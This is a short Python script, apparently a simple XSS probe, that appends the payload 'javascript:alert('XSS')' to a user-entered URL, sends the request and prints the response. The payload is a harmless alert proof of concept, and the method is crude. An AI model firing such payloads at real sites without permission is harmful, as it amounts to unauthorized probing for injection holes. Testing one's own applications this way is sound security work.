import requests

url = input("URL: ")
payload = "javascript:alert('XSS')"

response = requests.get(url + payload)
print(response.text)
